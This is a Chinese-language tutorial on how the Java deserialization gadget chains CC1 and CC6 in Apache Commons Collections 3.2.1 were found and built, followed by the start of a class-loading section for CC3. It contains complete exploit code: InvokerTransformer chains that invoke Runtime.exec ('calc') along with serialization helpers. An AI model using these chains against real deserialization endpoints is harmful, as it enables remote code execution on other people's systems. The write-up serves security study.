# 学习Commons Collections 的挖掘思路

## 前言

`commons collections`是一个对Java标准的集合框架，由Apache维护，不过3.0版本的`commons
collections`已经不再维护了，本次也是着重就3.0版本进行分析

本文不同于其他CC链来分析链是如何构建起来的，而是更多的去揣测或者理解链作者是如何找到该链，我们又能从中获得是什么收获，启发。

本次会就CC1，CC6和CC3进行分析，会涉及到如下知识点：

Java面向对象，Java反射，Java的JVM动态代理，和Java类加载机制等。

因为篇幅有限，在文中只能浅浅的指出，不能详细去分析各个知识点所起的重要作用，只能希望读者自行了解。

## 环境

本次使用的环境是

Java_1.8u65

Commons-Collections 3.2.1

Java是通过[第三方网站下载](https://blog.lupf.cn/tags/JDK8 "第三方网站下载")的

OpenJdk的[源码](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 "源码")

Commons-Collections则是直接使用Maven安装即可：

    
    
    <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    

> 有意思的是当你使用IDEA安装这个CC的时候人家会告诉你这个库存在漏洞，并且给出漏洞的CVE编号。

## 思路

反序列化通常开始于`readObject()`方法，这个方法定义在`ObjectInputStream`类中，用来从一个字节流来生成一个实例对象。

readObject方法可以被重写。

当我们所要生成的类中含有一个`readObject`方法的时候，则会自动调用这个`readObject`方法从而达到代码执行的目的。

这时候就等于拥有了一个执行代码的地方了，

但是很可惜的是代码我们不可控，好的是我们可以控制对象

通过一系列 **不同类但同名方法** 链接，从而执行到最终可以任意代码执行的类中。

![](./img/8543395769167101545.png)

具体思路如上图所示。

同名不同类方法一般有有很多思路，例如使用 **Object类的方法**
，这些可能被重写，但肯定都在；使用实现某接口的类，这些类都有接口所要求的方法；使用一些通用的方法，例如get，set等上面的三种方法我们在后面分析中都会提到。

# Commons Collections 1

## Transformer接口

拿到`commons
collections`链，我们可以发现一个使用非常广泛的接口`Transformer`，这个`Transformer`接口就如同名字一样，是用来做转换类型，值的转换的，同时也是我们应该高度关注的，因为他会产生很多不同类同名的方法。

这个接口也很简单，只需要实现一个`transform`方法即可：

![](./img/2481284984210976691.png)

这个方法接受一个Object对象，返回一个Object对象，十分宽泛。

为什么要找这个接口呢，因为当一个地方调用`transform`方法的时候，我们可以通过变换不同的实例对象从而达到执行不同的内容，并且一个使用的广泛的接口会有更多地方被使用。

看一下这个接口的实现类有哪些：

![](./img/46537470328218136.png)

我们将所有的实现了该接口的方法查看完后找出其中可能有用的几个方法介绍一下：

### `InvokerTransformer`类

首先要介绍的就是`InvokerTransformer`类，如同名字一样，这个类可以进行任意函数调用

看一下这个类的transform方法：

![](./img/3839104951695381645.png)

这个方法要做的就是调用传入类的一个方法并执行返回结果，

![](./img/4835552677567418321.png)

通过查看构造器可以很明显的看出，需要调用的方法都是可控的，也就是说这个类可以进行任意方法的调用。

### `ChainedTransformer`类

接下来要介绍的时ChainedTransformer类，看一下这个类的transform方法：

![](./img/6408294493877836583.png)

这个方法是传入一个Object对象，进行一个循环调用`iTransformers`的`transform`，将结果的Object作为下一次传入的Object。

通过查看构造器可以看出，这个`iTransformers`是可控的

![](./img/3388228271847999014.png)

### `ConstantTransformer`类

这是这次介绍的最后一个类，这个类十分简单：

![](./img/3669711093739334430.png)

构造器就是传入一个`iConstant`参数，`transform`调用的时候，不论传入一个什么对象，最后都返回这个这个实现设置好的`iConstant`参数。

## 思路过程

> 下面会将整个链子分成几个部分，纯属个人行为。

### 0x00第一部分

我们先写一个简单的Runtime来弹计算器，毕竟最后是要达到命令执行的

    
    
    Runtime runtime = Runtime.getRuntime();
    runtime.exec("calc");
    

下面用`InvokerTransformr`类进行执行

    
    
    Runtime runtime = Runtime.getRuntime();
    InvokerTransformer exec1 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
    exec1.transform(runtime);
    

现在我们就需要找一个能够触发`transform`方法的地方，从而来进行命令执行

通过Alt+F7来寻找方法的调用：

![](./img/4603596198501136538.png)

看到在CC库中调用最多的是`collections`包和`map`包

这里可以分析`LazyMap`类或者`TransformedMap`类，这里我们就看`TransformedMap`类

最后我们注意到`TransformedMap`类下，一个比较好调用的方法`checkSetValue`方法

![](./img/4538705229348436992.png)

可以猜出这个方法可能和`setValue`方法有关，而`setValue`又是一个较为普遍存在的方法，所以我们先研究下这个方法。

全局追踪这个`checkSetValue`方法：

![](./img/3057478046779022868.png)

可以发现仅有一个地方调用了`checkSetValue`，也就是我们事先猜想的`setValue`方法。

我们看一下这唯一调用 `checkSetValue`方法的`setValue`方法所在的类
`AbstractInputCheckedMapDecorator`
正是之前存在`checkSetValue`方法所在类`TransformedMap`的父类

![](./img/5913710013199500486.png)

那就说明 `TransformedMap`继承了父类的 `checkSetvalue`方法

查看`TransformedMap`类的构造器：

![](./img/7227391638023688528.png)

构造器被保护，但是可以看出是可以对我们需要的`valueTransformer`属性进行初始化

![](./img/3057604953232611571.png)

而构造器是由一个`decorate`静态方法调用，也就是说这个类是可控的。

到此问题就发送了变化，从之前的触发`transform`方法变成了触发`setValue`方法

完成第一部分的链子

  1. 新建一个`TransforedMap`类

`TransforedMap`类需要一个Map对象，和两个实现Transformer接口的对象：

    
        HashMap<Object, Object> hashMap = new HashMap<>();
     hashMap.put("value","value");
     Map<Object,Object> map = TransformedMap.decorate(hashMap,null,exec1);
    

这里使用了`HashMap`类创建Map对象，接着将实现transform方法的对象传入

  2. 简单写一个for循环检测一下能否成功触发计算器：
    
        for (Map.Entry entry :map.entrySet()) {
                 entry.setValue(runtime);
     }
    

经过测试是完全没有问题的，到此第一步就完成了

### 0x01第二部分

我们回到之前的地方，需要我们触发`setValue`方法  
我们全局搜索能够触发`setValue`方法的地方：

![](./img/6569712518128906051.png)

找到了一个绝杀的地方，就是在readObject中触发setValue方法，如果这个setValue方法参数可控，就意味着rce了

下面进入这个方法中进行查看：

![](./img/6791669253246668625.png)

可以看出人家的写法和我们触发setValue的写法不同， **其中传入的对象不可控** ，并且还有几个if判断

再看构造器

![](./img/2293724474136677420.png)

可以看出对传入的对象是直接赋值的，不过这个类连同构造器都是默认的`default`类型，只能通过反射创建

再回到`readObject`方法中重新捋一捋思路：

![](./img/8596920560055757350.png)

可以看出它是将传入的注解类型进行了实例化，然后取了其中的值存到`memberTypes`中

![](./img/6811303407079382778.png)

接着在for循环中，将默认传入的Map进行遍历，取出map中的key，然后再注解中进行查找，如果查找成功就执行第一个if，第二个是判断可不可以转换，肯定不可以，也通过。

到此我们就找到了绕过if的方法： **传入一个注解，这个注解中含有一个变量，这个变量名需要在传入Map的key中**

开始继续写链子：

首先就是这个`AnnotationInvocationHandler`类需要使用反射的方法获取

然后取出构造器才能实例化：

    
    
    Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor AIHcon = c.getDeclaredConstructor((Class<?>) Class.class, Map.class);
    AIHcon.setAccessible(true);
    

现在就需要考虑传入什么参数来创建，这里我们选用`Target`元注解，因为这个注解中存在一个值value：

![](./img/4850851451451800573.png)

我们将用来创建 `TransformedMap`的hashMap添加一个value的值：

    
    
    HashMap<Object, Object> hashMap = new HashMap<>();
    hashMap.put("value","value");
    Map<Object,Object> map = TransformedMap.decorate(hashMap,null,chainedTransformer);
    

然后就可以愉快的创建 `AnnotationInvocationHandler`对象了

    
    
    Object O = AIHcon.newInstance(Target.class,map);
    

剩下的就是反序列化这个O了，链子就算是找完了，但是到此这个链子仍然不能使用。

### 0x02第三部分

这部分就是为了修复之前链子存在的问题：

  1. `Runtime`类不支持序列化操作，需要改写
  2. `setValue`方法的传入参数不可控，需要绕过

我们先看第一个问题，`Runtime`类的改写，虽然`Runtime`不支持序列化，但是Class类支持呀，我们完全可以通过反射类创建一个`Runtime`类

#### Runtime改写

众所周知，Runtime是一个单例模式，所以不需要调用人家构造器，直接使用`getRuntime`类就可以了，所以我们只需要两个方法，一个是`getRuntime`方法，一个是`exec`方法就可以触发`exec`

    
    
    Class runtimeClass = Runtime.class;
    Method runtimeMethod =  runtimeClass.getMethod("getRuntime",null);
    Runtime runtime = (Runtime) runtimeMethod.invoke(null,null);
    Method exec1 = runtimeClass.getMethod("exec", String.class);
    

之后只需要使用

    
    
    exec1.invoke(runtime,"calc");
    

就可以弹计算器

但是放到这个题里，我们就需要进一步进行改写，是将其中的函数调用用`InvokeTransform`实现。

对上面的反射rec进行分析，可以发现其实是一多个方法嵌套执行的结果，所需要的方法就三个：调用`getMethod`方法获取`getRuntime`；然后执行`getRuntime`得到`Runtime`类；然后对结果`Runtime`类调用`exec`方法达到任意命令执行。

将以上三个步骤的方法用`InvokeTransform`实现：

    
    
    //getMethod
    InvokerTransformer getMethod1 = new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null});
    //invoke
    InvokerTransformer invoke = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null});
    //exec
    InvokerTransformer exec2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
    

最后的调用语句就是：

    
    
    exec2.transform(invoke.transform(getMethod1.transform(Runtime.class)));
    

连环嵌套，有点链子的感觉了

可以看出依旧是触发transform方法，就是复杂度提升了。

#### ChainedTransformer简化序列化链

这时候就需要用到我们开头介绍的`ChainedTransformer`类了。

这个类是用来连环执行transform的，将第一次的结果当作下一个接口的参数输入，然后得到的结果重复上面的操作。

创建一个Transformer数组，然后将上面的反序列化链传入其中：

    
    
    Transformer[] TrransFormers={
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
    

创建`ChainedTransformer`对象并传入数据

    
    
    ChainedTransformer chainedTransformer = new ChainedTransformer(TrransFormers);
    

那么现在触发反序列化就变得简单了：

    
    
    chainedTransformer.transform(Runtime.class);
    

#### setValue方法绕过

回到开头提出的那个问题，setValue传入的参数无法控制怎么办，使用我们开头提供的`ConstantTransformer`方法就可以绕过了，这时候我们就可以将传入参数变成从类中传入了，就解决了上面的问题。

修改方法也是十分简单，只需要在TrransFormers数组中加入`ConstantTransformer`类即可，完整的`TrransFormers`：

    
    
    Transformer[] TrransFormers={
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
    

这时候不论传入什么参数都可以执行命令

最后我们只需要将准备好的`chainedTransformer`对象传入`TransformedMap.decorate`方法中，再接着传入`AnnotationInvocationHandler`中，然后将结果序列化后就可以完成操作了。

附上完整的exp：

    
    
    package org.Payload.CC1;
    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    
    import java.io.IOException;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.Map;
    
    public class main {
        public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
            //用反射重写Runtime
            Class runtimeClass = Runtime.class;
            Method runtimeMethod =  runtimeClass.getMethod("getRuntime",null);
            Runtime runtime = (Runtime) runtimeMethod.invoke(null,null);
            Method exec1 = runtimeClass.getMethod("exec", String.class);
    
    
            InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
            //exec.transform(runtime);
    
    
            //用InvokerTransformer封装Runtime
            //getMethod
            InvokerTransformer getMethod1 = new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null});
            //invoke
    
            InvokerTransformer invoke = new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null});
            //exec
    
            InvokerTransformer exec2 = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
    
            //使用ChainedTransformer改写
    
            Transformer[] TrransFormers={
                    new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null,null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(TrransFormers);
            //chainedTransformer.transform(null);
    
    
    
            HashMap<Object, Object> hashMap = new HashMap<>();
            hashMap.put("value","value");
            Map<Object,Object> map = TransformedMap.decorate(hashMap,null,chainedTransformer);
    
    
    
            Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor AIHcon = c.getDeclaredConstructor((Class<?>) Class.class, Map.class);
            AIHcon.setAccessible(true);
            Object O = AIHcon.newInstance(Target.class,map);//O就是最后需要序列化的对象
            serialzie(O);//这个序列化需要自己封装
            unserialize();//反序列化也需要自己封装
    
    
        }
    }
    
    
    
    public static void serialzie(Object O) throws IOException {
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CC1.bin"));
                objectOutputStream.writeObject(O);
    
            }
            public static void unserialize() throws IOException, ClassNotFoundException {
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CC1.bin"));
                objectInputStream.readObject();
        }
    

### 0x03 ysoserial链

这条链不同于[ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java
"ysoserial")中的链，在调用transform方法时，上面是使用了TransformedMap类，ysoserial中使用的是LazyMap类。

![](./img/5126017203655417311.png)

里面是get方法触发transform方法：

![](./img/3483210908208895813.png)

用的懒汉式的设计模式，上面也写的很清楚，当不存在这个键的时候就通过transform方法来创建并且赋值

这里我们就直接使用最终的`chainedTransformer`，触发它的`transform`即可rce。

在什么地方找这个get呢，地方有很多，我们按照人家给的链子来看就是使用了我们了老朋友`AnnotationInvocationHandler`类，不过这次不再仅仅是使用这个类的`readObject`方法，而是调用`invoke`方法，源码如下：

    
    
    public Object invoke(Object proxy, Method method, Object[] args) {
            String member = method.getName();
            Class<?>[] paramTypes = method.getParameterTypes();
    
            // Handle Object and Annotation methods
            if (member.equals("equals") && paramTypes.length == 1 &&
                paramTypes[0] == Object.class)
                return equalsImpl(args[0]);
            if (paramTypes.length != 0)
                throw new AssertionError("Too many parameters for an annotation method");
    
            switch(member) {
            case "toString":
                return toStringImpl();
            case "hashCode":
                return hashCodeImpl();
            case "annotationType":
                return type;
            }
    
            // Handle annotation member accessors
            Object result = memberValues.get(member);
    
            if (result == null)
                throw new IncompleteAnnotationException(type, member);
    
            if (result instanceof ExceptionProxy)
                throw ((ExceptionProxy) result).generateException();
    
            if (result.getClass().isArray() && Array.getLength(result) != 0)
                result = cloneArray(result);
    
            return result;
        }
    

通过名字`AnnotationInvocationHandler`以及人家继承了`InvocationHandler`接口实现了`invoke`方法可以看出，这个类是一个注解的
**动态代理执行方法** ，也就是说当一个接口被执行的时候就会触发这个`invoke`方法。

通过源码我们发现，这些调用的方法不能是`equals` `toString` `hashCode` `annotationType`

那么接下来的问题就变成了寻找一个用来触发`invoke`的接口，并且使用`readObject`来调用。

这部分也是我觉得这个链最巧妙的地方，人家依旧是使用了`AnnotationInvocationHandler`类，
**这个类中的readObject是有一步使用了** **`entrySet()` ** **方法，而这个方法是在****`Map`** **接口中的**

那么自然而然，思路就变成了我们创建一个`AnnotationInvocationHandler`类反序列化（用来触发`entrySet`
），然后其中的`memberValues`
（就是我们传入需要调用get的对象）是一个用`AnnotationInvocationHandler`执行方法代理了Map接口的LazyMap动态代理对象。

当调用这个对象的时候就会触发`get`，然后命令执行。

代码如下：

获取AnnotationInvocationHandler的构造器

    
    
    //首先先通过反射获取这个类
    Class annotionIH = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    //获取构造器
    Constructor annotionIHConstructor =  annotionIH.getDeclaredConstructor(
                    (Class<?>) Class.class, Map.class);
    //提供权限
    annotionIHConstructor.setAccessible(true);
    

先生成一个动态代理执行函数，并代理LazyMap的Map接口：

    
    
    InvocationHandler h = (InvocationHandler) annotionIHConstructor.newInstance(Override.class,lazyMap);
    
    Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),
                    LazyMap.class.getInterfaces(),h);
    

接着在此使用构造器来生成`AnnotationInvocationHandler`对象

    
    
    Object O = annotionIHConstructor.newInstance(Override.class,map);
    

之后序列化这个O即可。

最终代码：

    
    
    package org.Payload.CC1;
    
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.omg.CORBA.portable.InvokeHandler;
    
    import java.io.IOException;
    import java.lang.invoke.LambdaConversionException;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    
    public class cc1LazyMap2 {
        public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, InstantiationException {
            ChainedTransformer chainedTransformer = new Util().chainedTransformer();
    
            HashMap<Object, Object> hashMap = new HashMap<>();
            LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);
    
    
            Class annotionIH = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            //获取构造器
            Constructor annotionIHConstructor =  annotionIH.getDeclaredConstructor(
                    (Class<?>) Class.class, Map.class);
            annotionIHConstructor.setAccessible(true);
    
    
            InvocationHandler h = (InvocationHandler) annotionIHConstructor.newInstance(Override.class,
                    lazyMap);
    
            Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),
                    LazyMap.class.getInterfaces(),h);
    
            Object O = annotionIHConstructor.newInstance(Override.class,map);
    
            Util.serialzie(O,"CC1.bin");//重写的工具类
    
            Util.unserialize("CC1.bin");//重写的工具类
    
        }
    
    }
    

最后附上链的调用图：

![](./img/4690147268910844444.png)

这个链子在创建了Map动态代理后感觉可以寻找的范围就变大了，只需要能在readObject中触发Map中常见的几个特定方法就可以触发这个漏洞，但是作者巧妙的是它最后在此利用了这个类进行触发操作，这也是这个链子有意思的地方之一。

我在此再提供一种可以在readObject中触发Map接口的类：`MapBackedSet`事实上这个类的发现也是十分有意思的，是我在后面CC6中寻找特定hashCode函数的时候偶然发现的，然后进过测试确实可以触发Map的方法，从而触发反序列化漏洞：实例代码：

    
    
    Object O = annotionIHConstructor.newInstance(Override.class,map);
    //替换为：
    MapBackedSet mapBackedSet = (MapBackedSet) MapBackedSet.decorate(map, new Object());
    //然后序列化这个mapBackedSet
    

# Commons Collections 6

## 引入

就上面讨论过的CC1而言，现在已经是不能用了，因为在8U71中对

`AnnotationInvocationHandler`的readObject方法进行了针对性的修改：

![](./img/3189655296341335167.png)

> 使用8u211环境看的，偷了个懒没有去找源码，就直接看class文件了

可以看出if执行完后并没有使用`setValue`的操作，而且前面也对参数的获取进行了修改，导致动态代理的CC1链失效了，到此就只能宣布CC1的沦陷了。

但是CC1给我们的收获仍然是丰厚的，我们仍然可以通过对前半部分补充从而获得一条新的链子。

在这种需求下就有人发现了CC6，这是一条不限版本的CC链，通用性很强，也是存在在commons collections3版本中的。

## 思考

通过CC1链以及修复的地方我们可以发现我们仍然可以通过触发LazyMap中的get方法从而达到RCE的目的。

因为要考虑到通用性这个条件，很自然就能想到DNSURL链，这个链具有通用性是因为它使用了`HashMap`中的`hashCode`方法，而这两个都是不会被ban的。

那么借用这个思想我们就可以找 **在hashCode方法中调用get方法的类**

![](./img/6391084727146118220.png)

我们发现有106个hashCode，

> 仔细找找就能找到我们上面提到的`MapBackedSet`类

下面进行分析，寻找可能存在get的地方：

  * 其中包括getkey/getvale方法的类有：

DefaultMapEntry（不支持反序列化）

SequencedHashMap（不支持反序列化）

AbstractMapEntry（abstract）

DefaultKeyValue （不支持反序列化）

TiedMapEntry （不支持反序列化）

AbstractHashedMap（不支持反序列化）

AbstractReferenceMap （不支持反序列化）

TiedMapEntry

Flat3Map

IdentityMap

SingletonMap

下面着重分析这三个类：

### Flat3Map

查看其中hashCode中调用的getvalue和getkey的源码

    
    
    public Object getKey() {
                if (canRemove == false) {
                    throw new IllegalStateException(AbstractHashedMap.GETKEY_INVALID);
                }
                switch (nextIndex) {
                    case 3:
                        return parent.key3;
                    case 2:
                        return parent.key2;
                    case 1:
                        return parent.key1;
                }
                throw new IllegalStateException("Invalid map index");
            }
    
            public Object getValue() {
                if (canRemove == false) {
                    throw new IllegalStateException(AbstractHashedMap.GETVALUE_INVALID);
                }
                switch (nextIndex) {
                    case 3:
                        return parent.value3;
                    case 2:
                        return parent.value2;
                    case 1:
                        return parent.value1;
                }
                throw new IllegalStateException("Invalid map index");
            }
    

很可惜没有调用get方法

### IdentityMap

![](./img/4569699038925768783.png)

也是同理没有调用

### SingletonMap

![](./img/2912755124240818223.png)

也是没有调用

### TiedMapEntry

![](./img/1637492915164690530.png)

其中getValue调用了get方法。

重新开始梳理这个了解这个`TiedMapEntry`类，看一下能不能利用一下

hashCode：

![](./img/6106646159591290950.png)

其中的getValue方法：

![](./img/7855746645011174249.png)

通过构造器可以看出

![](./img/656365539249799766.png)

map是可控的。到此一条完整了链子就出现在我们脑中。

## 过程

## 工具类

由于涉及到一些重复的代码，我就将重复的部分打包成一个工具类：

    
    
    package org.Payload;
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    
    import java.io.*;
    import java.lang.reflect.InvocationTargetException;
    
    public class Util implements Serializable{
        public  ChainedTransformer  chainedTransformer () throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
            //使用ChainedTransformer进行迭代
            ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new String[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"}),
            });
            //chainedTransformer.transform(Runtime.class);
            return chainedTransformer;
    
            }
            public static void serialzie(Object O,String name) throws IOException {
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(name));
                objectOutputStream.writeObject(O);
    
            }
            public static void unserialize(String name) throws IOException, ClassNotFoundException {
                ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(name));
                objectInputStream.readObject();
        }
    }
    

> 注意这个工具类也需要支持反序列化

工具类主要就是为了生成`chainedTransformer`调用链，并提供简单的序列化和反序列化函数方便我们进行检验。

## LazyMap

我们先生成一个LazyMap类，然后就可以通过调用人家的`get`方法RCE 了

LazyMap的构造器是保护的，需要我们通过人家给了`decorate`方法来创建，只需要传入一个Map和一个`Transformer`对象即可

![](./img/1136685568719712734.png)

我们这里使用`HashMap`来创建LazyMap，`Transformr`就是需要的`chainedTransformer`

    
    
    Util util = new Util();
    ChainedTransformer chainedTransformer = util.chainedTransformer();
    
    HashMap<Objects, Objects> hashLazyMap = new HashMap<>();
    
    LazyMap lazyMap  = (LazyMap) LazyMap.decorate(hashLazyMap,chainedTransformer);
    

## TideMapEntry

接着就是请出这次的主角`TideMapEntry`，这个Entry还是Public的，也就省的我们用反射去创建了

![](./img/2983372278812797828.png)

创建也是十分简单，一个Map一个key即可

之后触发`hashCode`就可以触发map的get，传入的key（这个传入无所谓的）

    
    
    //TideMapEntry
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
    

下面问题就变成了触发这个`tideMapEntry`的`hashCode`方法了

## HashCode

这个参考DNSURL链的前半段，使用HashMap方法触发

在HashMap的readObject方法中最后人家会在一个for循环中调用hash方法， **并将key传入**

![](./img/2653968050800509824.png)

而在hash中就会调用传入的`key`的 `hashCode`方法

![](./img/8596579199077190128.png)

然后就会触发上面的Entry了

代码如下：

    
    
    //new一个用来触发hashCode的HashCode
    HashMap<TiedMapEntry, String> hashMap = new HashMap<>();
    //将需要触发hashCode的Entry作为key传入其中，他的值无所谓
    hashMap.put(tiedMapEntry, "222");
    

然后就是序列化了：

    
    
    Util.serialzie(hashMap,"CC6.bin");
    Util.unserialize("CC6.bin");
    

## 调整修复

到此时如果执行代码的话，确实会触发反序列化，弹出计算器，但是实际上这个计算机是在 **序列化的时候弹出的** 并不是在反序列化的时候弹出的。

这个问题在DNSURL链中也同样出现过，主要原因就是在put的时候就会触发`hashCode`

![](./img/3896709497144416525.png)

执行的指令和`readObject`中一模一样

这里的修复思路就是在put前将链子截断，put后在重新修好，这个过程可以通过反射完成

截断链子的地方很多，我们这里选取`lazymap`传入`chainedTransforms`的时候这里截断，这里我们随便传入一个`Transformr`接口对象即可

    
    
    LazyMap lazyMap  = (LazyMap) LazyMap.decorate(hashLazyMap,new ConstantTransformer(1));
    

之后再put后修改即可

    
    
    //重新修理这个链接
    Class LazyMapClass = LazyMap.class;
    Field factoryfield = LazyMapClass.getDeclaredField("factory");
    factoryfield.setAccessible(true);
    factoryfield.set(lazyMap,chainedTransformer);
    

此时运行的时候就不会在序列化的时候触发漏洞了。

但是不幸的是反序列化的时候也不会触发漏洞，这个问题就需要涉及到LazyMap的懒汉式设计方式了，简单来说就是当我们调用这个Map的值的时候，如果人家没有值才会触发transform方法从而生成这个值，
并传入Map中， **如果这个值存在就不会触发** **`transform`** **了**
，很明显这个地方就是因为本地触发过一次transform方法了，给LazyMap写入值了，到目标机器后就不会调用transform方法而是直接调用，明显不符合我们的预期。

而触发的地方也很明显，还是那个put函数：

![](./img/1503475510974744811.png)

人家调用hash的时候不仅仅会触发hashCode方法，进而进入到LazyMap中触发transform方法。

修改方法也很简单，就是将put的误生成的数据删除即可：

    
    
    //这一步会加入数据：
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
    ...
    ...
    //put后删除该数据即可
    lazyMap.remove("111");
    

到此整条链子就分析完成了。

## 完整代码

工具类：参考上面

    
    
    package org.Payload.CC6;
    
    import org.Payload.Util;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    
    import java.io.File;
    import java.io.IOException;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.util.HashMap;
    import java.util.Objects;
    
    public class CC6 {
        public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, IllegalAccessException, InstantiationException, NoSuchFieldException {
            Util util = new Util();
            ChainedTransformer chainedTransformer = util.chainedTransformer();
    
            HashMap<Objects, Objects> hashLazyMap = new HashMap<>();
    
            //防止序列化的时候触发漏洞
            LazyMap lazyMap  = (LazyMap) LazyMap.decorate(hashLazyMap,new ConstantTransformer(1));
    
            //TideMapEntry
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
    
            //new一个用来触发hashCode的HashCode
            HashMap<TiedMapEntry, String> hashMap = new HashMap<>();
            //将需要触发hashCode的Entry作为key传入其中，他的值无所谓
            hashMap.put(tiedMapEntry, "222");
    
            //重新修理这个链接
            Class LazyMapClass = LazyMap.class;
            Field factoryfield = LazyMapClass.getDeclaredField("factory");
            factoryfield.setAccessible(true);
            factoryfield.set(lazyMap,chainedTransformer);
    
            lazyMap.remove("111");
    
            Util.serialzie(hashMap,"CC6.bin");
            Util.unserialize("CC6.bin");
    
        }
    }
    

最后附上反序列化链图：

![](./img/7272350555788336416.png)

# Commons Collections 3

## 简介

本次使用的JDK版本仍是Java 1.8u65

通过上面的分析我们已经可以用两种不同的方式进行触发我们需要的方法了，这次我们讲探究一种新的代码执行方法： **动态类加载** 。

主要的使用场景就是当被禁用`Runtime`类的时候或者说需要执行任意代码的时候，有时候任意代码会比rce更加灵活。

由于这次不同的仅仅是后面代码执行的地方的不一样，所以前半部分到`InvokerTransformer`的地方都是不变的。可以使用CC1链的前半部分，也可以使用CC6的前半部分。

本节也会提供一种新的挖掘方向和思路。

## 简述类加载

java的文件进过编译后会生成一个个.class的字节码文件，而我们将这些文件/类加载到内存中并使用的过程就称为类加载。

在这里我们简单了认为类加载分为两个过程： **加载** 和 **初始化**

通用我们简单的认为加载就是将字节码文件读入到内存中，初始化就是将这些数据进行识别和预处理。

值得注意的是之后在进行初始化操作的时候才会进行类中静态代码块的执行。

常见的初始化包括new一个对象的时候，或者反射forName调用的时候

forName有两个重载，其中一个就可以控制时候进行重载

![](./img/4552742163182850225.png)

而默认的forName是进行重载的

![](./img/2838944795706212179.png)

forName方法最终都会调用forname0方法，但是这个方法是又c/c++写的原生方法，具体实现我们就不过多探究

这边不做过多演示，读者可以自行实操。

## 类加载器

正常情况下的类加载都是通过类加载器完成的，类的加载规则是双亲委派机制，

![](./img/1399636756571158815.png)

简单来说就是加载前问问其他加载器有没有加载，没有加载自己再加载，因为如果同一个类被不同的加载器加载就会导致在内存中一个类被加载两次，从而出现问题。

具体的过程可以参考类加载器的源码`loadClass`方法了解

![](./img/5099735660605520787.png)

